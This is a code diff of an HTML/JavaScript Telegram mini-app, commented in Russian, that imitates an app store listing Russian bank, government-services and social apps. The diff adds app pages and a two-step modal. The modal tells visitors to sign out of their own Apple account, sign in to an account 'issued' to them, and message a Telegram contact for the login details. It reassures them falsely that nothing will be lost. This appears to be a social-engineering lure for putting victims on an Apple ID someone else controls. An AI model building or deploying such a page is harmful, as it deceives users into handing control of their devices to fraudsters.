@@ -14,6 +14,7 @@
   * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
   body { font-family: 'Inter', sans-serif; background-color: var(--bg-color); margin: 0; padding: 16px; color: var(--text-main); }
   
+  /* Главная */
   .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; }
   .logo-area { display: flex; align-items: center; gap: 10px; }
   .logo-icon { width: 40px; height: 40px; background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 20px; }
@@ -32,22 +33,50 @@
   .cat-icon { width: 32px; height: 32px; border-radius: 10px; background: rgba(255,255,255,0.2); display: flex; justify-content: center; align-items: center; }
   .cat-white .cat-icon { background: #f0f4ff; color: var(--blue); }
 
-  #list-page { display: none; background: var(--bg-color); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; overflow-y: auto; padding: 16px; padding-bottom: 50px;}
+  /* Каталог */
+  #list-page, #app-page { display: none; background: var(--bg-color); position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; overflow-y: auto; padding: 16px; padding-bottom: 50px;}
   .top-bar { display: flex; align-items: center; gap: 16px; margin-bottom: 20px; position: sticky; top: 0; background: var(--bg-color); padding-top: 10px; z-index: 10;}
   .back-btn { font-size: 24px; cursor: pointer; padding: 8px; }
   .letter-header { font-size: 20px; font-weight: 700; color: #ccc; margin: 20px 0 10px 0; }
-  .app-item { background: var(--card-bg); border-radius: 16px; padding: 12px; display: flex; align-items: center; gap: 12px; margin-bottom: 12px; }
-  .app-icon { width: 56px; height: 56px; border-radius: 14px; background: #eee; object-fit: cover; }
+  .app-item { background: var(--card-bg); border-radius: 16px; padding: 12px; display: flex; align-items: center; gap: 12px; margin-bottom: 12px; cursor: pointer; }
+  
+  /* Иконки */
+  .app-icon { width: 56px; height: 56px; border-radius: 14px; object-fit: cover; display: flex; justify-content: center; align-items: center; font-size: 24px; font-weight: 700; color: white; flex-shrink: 0;}
+  
   .app-info { flex: 1; overflow: hidden;}
   .app-name { font-weight: 600; font-size: 15px; margin-bottom: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;}
   .app-desc { font-size: 12px; color: var(--text-sub); margin-bottom: 4px;}
   .app-rating { font-size: 11px; color: #aaa; display: flex; align-items: center; gap: 4px;}
   .btn-get { background: var(--blue); color: white; border: none; border-radius: 20px; padding: 8px 16px; font-weight: 600; font-size: 13px; cursor: pointer; flex-shrink: 0;}
 
+  /* Страница приложения */
+  .app-header { display: flex; gap: 16px; margin-bottom: 24px; }
+  .app-header .app-icon { width: 80px; height: 80px; border-radius: 20px; font-size: 36px; }
+  .app-header-info h1 { margin: 0 0 4px 0; font-size: 22px; }
+  .app-header-info .sub { color: var(--text-sub); font-size: 14px; margin-bottom: 4px;}
+  .app-header-info .rating { font-size: 14px; color: #f5a623; font-weight: 600;}
+  
+  .app-actions { display: flex; gap: 12px; margin-bottom: 24px; }
+  .btn-main { flex: 1; background: var(--blue); color: white; border: none; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 600; display: flex; justify-content: center; align-items: center; gap: 8px; }
+  .btn-outline { flex: 1; background: var(--card-bg); color: var(--text-main); border: none; padding: 16px; border-radius: 16px; font-size: 16px; font-weight: 600; display: flex; justify-content: center; align-items: center; gap: 8px; }
+  
+  .stats-row { display: flex; justify-content: space-between; background: var(--card-bg); padding: 16px; border-radius: 16px; text-align: center; margin-bottom: 24px; }
+  .stat-item { flex: 1; border-right: 1px solid #eee; }
+  .stat-item:last-child { border-right: none; }
+  .stat-val { font-weight: 700; font-size: 16px; margin-bottom: 4px;}
+  .stat-label { font-size: 11px; color: var(--text-sub); text-transform: uppercase;}
+
+  .screenshots { display: flex; gap: 12px; overflow-x: auto; padding-bottom: 10px; }
+  .screenshot { height: 250px; border-radius: 16px; object-fit: cover; }
+
+  /* Модалка Инструкция */
   .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); z-index: 200; align-items: flex-end; }
   .modal-content { background: white; width: 100%; border-radius: 24px 24px 0 0; padding: 24px; max-height: 90vh; overflow-y: auto; }
   .modal-header { text-align: center; font-size: 20px; font-weight: 700; margin-bottom: 16px; position: relative;}
-  .close-modal { position: absolute; right: 0; top: 0; font-size: 24px; color: #999; cursor: pointer;}
+  .close-modal { position: absolute; right: 0; top: 0; font-size: 24px; color: #999; cursor: pointer; padding: 5px;}
+  
+  /* Второй шаг инструкции */
+  #step2 { display: none; }
 </style>
 </head>
 <body>
@@ -77,196 +106,161 @@
   </div>
 </div>
 
-<!-- КАТАЛОГ (СПИСОК ОТ А ДО Я) -->
+<!-- СПИСОК ОТ А ДО Я -->
 <div id="list-page">
   <div class="top-bar">
     <div class="back-btn" onclick="goBack()">←</div>
     <div style="font-weight: 700; font-size: 18px;">От А до Я</div>
   </div>
 
-  <!-- БУКВА А -->
   <div class="letter-header">А</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Avito_logo.svg/512px-Avito_logo.svg.png" class="app-icon" style="background: white; padding: 5px;">
+  <!-- Авито -->
+  <div class="app-item" onclick="openApp('Авито', 'Шоппинг · Объявления', '4.5', '540 тыс.', '#FF5A5F', 'А')">
+    <div class="app-icon" style="background: #FF5A5F;">А</div>
     <div class="app-info"><div class="app-name">Авито — путешествия</div><div class="app-desc">Шоппинг · Объявления</div><div class="app-rating">⭐ 4.5 · 540 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Авито')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/33/Alfa-Bank_logo.svg/512px-Alfa-Bank_logo.svg.png" class="app-icon" style="background: #EF3124; padding: 5px;">
+  
+  <!-- Альфа-Банк (с картинкой) -->
+  <div class="app-item" onclick="openApp('Альфа-Банк', 'Финансы · Альфа', '4.7', '225 тыс.', '#EF3124', 'А', 'img_alfa')">
+    <!-- ТУТ ВСТАВЛЕНА КАРТИНКА В ФОРМАТЕ BASE64 -->
+    <img id="img_alfa" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////2wBDAf//////////////////////////////////////////////////////////////////////////////////////wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAf/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAA8A/9k=" class="app-icon">
     <div class="app-info"><div class="app-name">Альфа-Банк</div><div class="app-desc">Финансы · Альфа</div><div class="app-rating">⭐ 4.7 · 225 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Альфа-Банк')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
 
-  <!-- БУКВА В -->
   <div class="letter-header">В</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/VK_logo_2021.svg/512px-VK_logo_2021.svg.png" class="app-icon" style="background: #0077FF; padding: 5px;">
+  <!-- ВК -->
+  <div class="app-item" onclick="openApp('ВКонтакте', 'Соцсети · ВК', '4.5', '900 тыс.', '#0077FF', 'В')">
+    <div class="app-icon" style="background: #0077FF;">В</div>
     <div class="app-info"><div class="app-name">ВКонтакте: чаты, видео</div><div class="app-desc">Соцсети · ВК</div><div class="app-rating">⭐ 4.5 · 900 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('ВКонтакте')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8c/VTB_Logo_2022.svg/512px-VTB_Logo_2022.svg.png" class="app-icon" style="background: #0A2896; padding: 5px;">
+  
+  <!-- ВТБ -->
+  <div class="app-item" onclick="openApp('ВТБ Онлайн', 'Финансы', '4.7', '3.6 млн', '#0A2896', 'В')">
+    <div class="app-icon" style="background: #0A2896;">В</div>
     <div class="app-info"><div class="app-name">ВТБ Онлайн</div><div class="app-desc">Финансы</div><div class="app-rating">⭐ 4.7 · 3.6 млн</div></div>
-    <button class="btn-get" onclick="getApp('ВТБ Онлайн')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b6/Wildberries_Logo.png/512px-Wildberries_Logo.png" class="app-icon" style="background: #CB11AB; padding: 5px;">
+
+  <!-- Wildberries -->
+  <div class="app-item" onclick="openApp('Wildberries', 'Шоппинг · Маркетплейс', '4.4', '690 тыс.', '#CB11AB', 'W')">
+    <div class="app-icon" style="background: #CB11AB;">W</div>
     <div class="app-info"><div class="app-name">Wildberries</div><div class="app-desc">Шоппинг · Маркетплейс</div><div class="app-rating">⭐ 4.4 · 690 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Wildberries')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
 
-  <!-- БУКВА Г -->
   <div class="letter-header">Г</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Government_of_Russia_Logo.svg/512px-Government_of_Russia_Logo.svg.png" class="app-icon" style="background: #fff; padding: 5px;">
+  <!-- Госуслуги -->
+  <div class="app-item" onclick="openApp('Госуслуги', 'Утилиты · Госуслуги', '4.3', '320 тыс.', '#005BFF', 'Г')">
+    <div class="app-icon" style="background: #005BFF;">Г</div>
     <div class="app-info"><div class="app-name">Госуслуги</div><div class="app-desc">Утилиты · Госуслуги</div><div class="app-rating">⭐ 4.3 · 320 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Госуслуги')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8a/Generator_AI_icon.png/512px-Generator_AI_icon.png" class="app-icon" style="background: #000; padding: 5px;">
-    <div class="app-info"><div class="app-name">Генератор ИИ видео</div><div class="app-desc">ИИ · Видео</div><div class="app-rating">⭐ 4.6 · 76 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Генератор ИИ видео')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
 
-  <!-- БУКВА Д -->
-  <div class="letter-header">Д</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/17/Dino_Run_icon.png/512px-Dino_Run_icon.png" class="app-icon" style="background: #eee; padding: 5px;">
-    <div class="app-info"><div class="app-name">Dino Run</div><div class="app-desc">Игры · Аркада</div><div class="app-rating">⭐ 4.5 · 88 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Dino Run')">Получить</button>
-  </div>
-
-  <!-- БУКВА М -->
-  <div class="letter-header">М</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/91/Minecraft_2024_cover_art.png/512px-Minecraft_2024_cover_art.png" class="app-icon" style="background: #eee; padding: 5px;">
-    <div class="app-info"><div class="app-name">Minecraft</div><div class="app-desc">Игры · Песочница</div><div class="app-rating">⭐ 4.7 · 2.1 млн</div></div>
-    <button class="btn-get" onclick="getApp('Minecraft')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4e/Mail.ru_logo.svg/512px-Mail.ru_logo.svg.png" class="app-icon" style="background: #005FF9; padding: 5px;">
-    <div class="app-info"><div class="app-name">Mail: Почта, Облако</div><div class="app-desc">Соцсети · Почта</div><div class="app-rating">⭐ 4.7 · 2.1 млн</div></div>
-    <button class="btn-get" onclick="getApp('Mail')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/MangaLib_Logo.png/512px-MangaLib_Logo.png" class="app-icon" style="background: #333; padding: 5px;">
-    <div class="app-info"><div class="app-name">MangaLib — Манга, р...</div><div class="app-desc">Книги</div><div class="app-rating">⭐ 4.6 · 512</div></div>
-    <button class="btn-get" onclick="getApp('MangaLib')">Получить</button>
-  </div>
-
-  <!-- БУКВА Н -->
-  <div class="letter-header">Н</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6e/Nulls_Brawl_icon.png/512px-Nulls_Brawl_icon.png" class="app-icon" style="background: #eee; padding: 5px;">
-    <div class="app-info"><div class="app-name">Nulls Brawl</div><div class="app-desc">Игры · Приватный сервер</div><div class="app-rating">⭐ 4.6 · 540 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Nulls Brawl')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/13/Happ_logo.png/512px-Happ_logo.png" class="app-icon" style="background: #333; padding: 5px;">
-    <div class="app-info"><div class="app-name">Happ Plus VPN</div><div class="app-desc">VPN</div><div class="app-rating">⭐ 4.9 · 1.1 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Happ Plus VPN')">Получить</button>
-  </div>
-
-  <!-- БУКВА О -->
-  <div class="letter-header">О</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Odnoklassniki_logo_2019.svg/512px-Odnoklassniki_logo_2019.svg.png" class="app-icon" style="background: #EE8208; padding: 5px;">
-    <div class="app-info"><div class="app-name">Одноклассники: соц...</div><div class="app-desc">Соцсети</div><div class="app-rating">⭐ 4.9 · 20 млн+</div></div>
-    <button class="btn-get" onclick="getApp('Одноклассники')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/OZON_logo_RGB.png/512px-OZON_logo_RGB.png" class="app-icon" style="background: #005BFF; padding: 5px;">
-    <div class="app-info"><div class="app-name">OZON: товары, одеж...</div><div class="app-desc">Шоппинг · Маркетплейс</div><div class="app-rating">⭐ 4.6 · 760 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('OZON')">Получить</button>
-  </div>
-
-  <!-- БУКВА Р -->
   <div class="letter-header">Р</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Rave_App_Icon.png/512px-Rave_App_Icon.png" class="app-icon" style="background: #000; padding: 5px;">
+  <!-- Rave -->
+  <div class="app-item" onclick="openApp('Rave', 'Развлечения', '4.4', '355', '#000000', 'R')">
+    <div class="app-icon" style="background: #000000;">R</div>
     <div class="app-info"><div class="app-name">Rave</div><div class="app-desc">Развлечения</div><div class="app-rating">⭐ 4.4 · 355</div></div>
-    <button class="btn-get" onclick="getApp('Rave')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
-
-  <!-- БУКВА С -->
+  
   <div class="letter-header">С</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/86/Sberbank_Logo_2020.svg/512px-Sberbank_Logo_2020.svg.png" class="app-icon" style="background: #21A038; padding: 5px;">
+  <!-- Сбер -->
+  <div class="app-item" onclick="openApp('Сбербанк Онлайн', 'Финансы · Сбер', '4.7', '980 тыс.', '#21A038', 'С')">
+    <div class="app-icon" style="background: #21A038;">С</div>
     <div class="app-info"><div class="app-name">Сбербанк Онлайн</div><div class="app-desc">Финансы · Сбер</div><div class="app-rating">⭐ 4.7 · 980 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Сбербанк Онлайн')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/19/Stand_Rise_Logo.png/512px-Stand_Rise_Logo.png" class="app-icon" style="background: #333; padding: 5px;">
-    <div class="app-info"><div class="app-name">Stand Rise</div><div class="app-desc">Игры · Шутер</div><div class="app-rating">⭐ 4.4 · 210 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Stand Rise')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/84/Spotify_icon.svg/512px-Spotify_icon.svg.png" class="app-icon" style="background: #1DB954; padding: 5px;">
-    <div class="app-info"><div class="app-name">Spotify</div><div class="app-desc">Развлечения</div><div class="app-rating">⭐ 4.1 · 1.3 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Spotify')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
 
-  <!-- БУКВА Т -->
   <div class="letter-header">Т</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/T-Bank_Logo_2023.svg/512px-T-Bank_Logo_2023.svg.png" class="app-icon" style="background: #FFDD2D; padding: 5px;">
+  <!-- Т-Банк -->
+  <div class="app-item" onclick="openApp('Т-Банк', 'Финансы · Т-Банк', '4.8', '1.2 млн', '#FFDD2D', 'Т')">
+    <div class="app-icon" style="background: #FFDD2D; color: black;">Т</div>
     <div class="app-info"><div class="app-name">Т-Банк</div><div class="app-desc">Финансы · Т-Банк</div><div class="app-rating">⭐ 4.8 · 1.2 млн</div></div>
-    <button class="btn-get" onclick="getApp('Т-Банк')">Получить</button>
+    <button class="btn-get">Получить</button>
   </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6a/TikTok_logo.svg/512px-TikTok_logo.svg.png" class="app-icon" style="background: #000; padding: 5px;">
-    <div class="app-info"><div class="app-name">TikTok (Mod)</div><div class="app-desc">Соцсети · Видео</div><div class="app-rating">⭐ 4.6 · 3.2 млн</div></div>
-    <button class="btn-get" onclick="getApp('TikTok')">Получить</button>
-  </div>
-
-  <!-- БУКВА Ч -->
-  <div class="letter-header">Ч</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/Chat_Roulette_Logo.png/512px-Chat_Roulette_Logo.png" class="app-icon" style="background: #0077FF; padding: 5px;">
-    <div class="app-info"><div class="app-name">Чат Рулетка</div><div class="app-desc">Общение</div><div class="app-rating">⭐ 5 · 32 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Чат Рулетка')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4b/ChatGPT_logo.svg/512px-ChatGPT_logo.svg.png" class="app-icon" style="background: #fff; padding: 5px;">
-    <div class="app-info"><div class="app-name">ChatGPT PRO</div><div class="app-desc">ИИ · Ассистент</div><div class="app-rating">⭐ 4.8 · 1.5 млн</div></div>
-    <button class="btn-get" onclick="getApp('ChatGPT PRO')">Получить</button>
-  </div>
-
-  <!-- БУКВА Я -->
-  <div class="letter-header">Я</div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/Yandex_Pay_logo.svg/512px-Yandex_Pay_logo.svg.png" class="app-icon" style="background: #000; padding: 5px;">
-    <div class="app-info"><div class="app-name">Яндекс Пэй: QR, NFC</div><div class="app-desc">Финансы</div><div class="app-rating">⭐ 4.5 · 35.8 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Яндекс Пэй')">Получить</button>
-  </div>
-  <div class="app-item">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Yandex_logo_2021.svg/512px-Yandex_logo_2021.svg.png" class="app-icon" style="background: #FC3F1D; padding: 5px;">
-    <div class="app-info"><div class="app-name">Яндекс</div><div class="app-desc">Утилиты · Поиск</div><div class="app-rating">⭐ 4.7 · 450 тыс.</div></div>
-    <button class="btn-get" onclick="getApp('Яндекс')">Получить</button>
-  </div>
-
 </div>
 
-<!-- МОДАЛЬНОЕ ОКНО -->
+<!-- СТРАНИЦА ПРИЛОЖЕНИЯ (открывается при клике) -->
+<div id="app-page">
+  <div class="top-bar">
+    <div class="back-btn" onclick="goBackToList()">←</div>
+    <div id="app-page-title" style="font-weight: 700; font-size: 18px;">Название</div>
+  </div>
+
+  <div class="app-header">
+    <div id="app-page-icon" class="app-icon">A</div>
+    <div class="app-header-info">
+      <h1 id="app-page-name">Название</h1>
+      <div id="app-page-desc" class="sub">Описание</div>
+      <div id="app-page-rating" class="rating">⭐ 4.5</div>
+    </div>
+  </div>
+
+  <div class="app-actions">
+    <button class="btn-main" onclick="openModal()">⬇️ Получить аккаунт</button>
+    <button class="btn-outline" onclick="openModal()">📖 Инструкция</button>
+  </div>
+
+  <div class="stats-row">
+    <div class="stat-item"><div id="stat-rating" class="stat-val">4.5 ★</div><div id="stat-count" class="stat-label">900 тыс.</div></div>
+    <div class="stat-item"><div class="stat-val">12+</div><div class="stat-label">Возраст</div></div>
+    <div class="stat-item"><div class="stat-val">Соцсети</div><div class="stat-label">Категория</div></div>
+    <div class="stat-item"><div class="stat-val">126 МБ</div><div class="stat-label">Размер</div></div>
+  </div>
+
+  <!-- Заглушка для скриншотов -->
+  <div class="screenshots">
+    <div style="min-width: 150px; height: 250px; background: #0077FF; border-radius: 16px; display: flex; justify-content: center; align-items: center; color: white; font-weight: bold;">Скриншот 1</div>
+    <div style="min-width: 150px; height: 250px; background: #7b61ff; border-radius: 16px; display: flex; justify-content: center; align-items: center; color: white; font-weight: bold;">Скриншот 2</div>
+  </div>
+</div>
+
+<!-- МОДАЛЬНОЕ ОКНО С ИНСТРУКЦИЕЙ -->
 <div class="modal-overlay" id="modal">
   <div class="modal-content">
-    <div class="modal-header">
-      Шаг 1 · Выход из аккаунта
-      <span class="close-modal" onclick="closeModal()">×</span>
+    <!-- ШАГ 1 -->
+    <div id="step1">
+      <div class="modal-header">
+        Шаг 1 · Выход из аккаунта
+        <span class="close-modal" onclick="closeModal()">×</span>
+      </div>
+      <div style="background: #0a192f; border-radius: 16px; padding: 20px; color: white; text-align: center; margin-bottom: 20px;">
+        <div style="font-size: 12px; background: rgba(255,255,255,0.1); display: inline-block; padding: 4px 10px; border-radius: 10px; margin-bottom: 10px;">▶ ВИДЕОИНСТРУКЦИЯ</div>
+        <div style="font-size: 20px; font-weight: bold; margin-bottom: 10px;">Как скачать<br>приложение</div>
+      </div>
+      <p style="font-size: 14px; color: #444; line-height: 1.5;">Сначала выйдите из своего аккаунта App Store: откройте «Настройки» → ваше имя вверху → пролистайте вниз и нажмите «Выйти».</p>
+      <div style="background: #e8f5e9; border-radius: 12px; padding: 16px; display: flex; gap: 10px; margin-top: 16px;">
+        <div style="color: #2e7d32;">🛡️</div>
+        <div style="font-size: 13px; color: #2e7d32; line-height: 1.4;"><b>Ничего не удалится.</b> Ваши данные остаются на телефоне.</div>
+      </div>
+      <div style="text-align: center; margin-top: 24px;">
+        <div style="font-size: 14px; font-weight: 600; margin-bottom: 12px;">Вы вышли из аккаунта?</div>
+        <button style="width: 100%; background: var(--blue); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600;" onclick="nextStep()">Да, я вышел(ла) →</button>
+      </div>
     </div>
-    <div style="background: #0a192f; border-radius: 16px; padding: 20px; color: white; text-align: center; margin-bottom: 20px;">
-      <div style="font-size: 12px; background: rgba(255,255,255,0.1); display: inline-block; padding: 4px 10px; border-radius: 10px; margin-bottom: 10px;">▶ ВИДЕОИНСТРУКЦИЯ</div>
-      <div style="font-size: 20px; font-weight: bold; margin-bottom: 10px;">Как скачать<br>приложение</div>
+
+    <!-- ШАГ 2 -->
+    <div id="step2">
+      <div class="modal-header">
+        Шаг 2 · Вход в выданный аккаунт
+        <span class="close-modal" onclick="closeModal()">×</span>
+      </div>
+      <p style="font-size: 14px; color: #444; line-height: 1.5;">Теперь откройте «Настройки» → «Аккаунт Apple» → «Войти вручную». Данные для входа вы получите на следующем шаге.</p>
+      
+      <div style="display: flex; gap: 10px; margin: 20px 0;">
+         <div style="flex:1; background:#f0f0f5; border-radius:12px; height:200px; display:flex; justify-content:center; align-items:center; font-size:12px; color:#888;">Настройки</div>
+         <div style="flex:1; background:#333; border-radius:12px; height:200px; display:flex; justify-content:center; align-items:center; font-size:12px; color:#888;">Вход</div>
+      </div>
+
+      <div style="text-align: center; margin-top: 24px;">
+        <button style="width: 100%; background: var(--blue); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600;" onclick="goToTelegram()">⬇️ Получить данные</button>
+      </div>
     </div>
-    <p style="font-size: 14px; color: #444; line-height: 1.5;">Сначала выйдите из своего аккаунта App Store: откройте «Настройки» → ваше имя вверху → пролистайте вниз и нажмите «Выйти».</p>
-    <div style="background: #e8f5e9; border-radius: 12px; padding: 16px; display: flex; gap: 10px; margin-top: 16px;">
-      <div style="color: #2e7d32;">🛡️</div>
-      <div style="font-size: 13px; color: #2e7d32; line-height: 1.4;"><b>Ничего не удалится.</b> Ваши данные остаются на телефоне.</div>
-    </div>
-    <div style="text-align: center; margin-top: 24px;">
-      <div style="font-size: 14px; font-weight: 600; margin-bottom: 12px;">Вы вышли из аккаунта?</div>
-      <button id="confirm-btn" style="width: 100%; background: var(--blue); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600;">Да, я вышел(ла) →</button>
-    </div>
+
   </div>
 </div>
 
@@ -275,8 +269,12 @@
   tg.expand();
   tg.ready();
 
-  // ВПИШИ СЮДА СВОЙ НИК БЕЗ @
+  // ТВОЙ НИК
   const myTelegramUsername = "ТВОЙ_НИКНЕЙМ"; 
+
+  let currentAppName = "";
+  let currentAppIconBg = "#000";
+  let currentAppLetter = "A";
 
   function openList() {
     document.getElementById('main-page').style.display = 'none';
@@ -288,23 +286,55 @@
     document.getElementById('list-page').style.display = 'none';
   }
 
+  function goBackToList() {
+    document.getElementById('app-page').style.display = 'none';
+    document.getElementById('list-page').style.display = 'block';
+  }
+
+  // Открытие страницы приложения
+  function openApp(name, desc, rating, count, bgColor, letter, imgId) {
+    currentAppName = name;
+    currentAppIconBg = bgColor;
+    currentAppLetter = letter;
+
+    document.getElementById('list-page').style.display = 'none';
+    document.getElementById('app-page').style.display = 'block';
+
+    document.getElementById('app-page-title').innerText = name;
+    document.getElementById('app-page-name').innerText = name;
+    document.getElementById('app-page-desc').innerText = desc;
+    document.getElementById('app-page-rating').innerText = "⭐ " + rating;
+    document.getElementById('stat-rating').innerText = rating + " ★";
+    document.getElementById('stat-count').innerText = count;
+
+    // Устанавливаем иконку (если это картинка, копируем src, иначе ставим букву)
+    let iconDiv = document.getElementById('app-page-icon');
+    if(imgId) {
+      let img = document.getElementById(imgId);
+      iconDiv.outerHTML = `<img id="app-page-icon" src="${img.src}" class="app-icon">`;
+    } else {
+      iconDiv.outerHTML = `<div id="app-page-icon" class="app-icon" style="background: ${bgColor};">${letter}</div>`;
+    }
+  }
+
   function openModal() {
+    document.getElementById('step1').style.display = 'block';
+    document.getElementById('step2').style.display = 'none';
     document.getElementById('modal').style.display = 'flex';
+  }
+
+  function nextStep() {
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
   }
 
   function closeModal() {
     document.getElementById('modal').style.display = 'none';
   }
 
-  function getApp(appName) {
-    openModal();
-    const btn = document.getElementById('confirm-btn');
-    const text = encodeURIComponent(`Здравствуйте, я по поводу установки приложения ${appName}, я вышел(-ла) из своего аккаунта, ожидаю данные.`);
-    
-    btn.onclick = function() {
-      // Эта ссылка открывает чат и вставляет текст
-      window.location.href = `https://t.me/Installer_Apps{myTelegramUsername}?text=${text}`;
-    };
+  function goToTelegram() {
+    const text = encodeURIComponent(`Здравствуйте, я по поводу установки приложения ${currentAppName}, я вышел(-ла) из своего аккаунта, ожидаю данные.`);
+    window.location.href = `https://t.me/Installer_Apps{myTelegramUsername}?text=${text}`;
   }
 </script>
 </body>
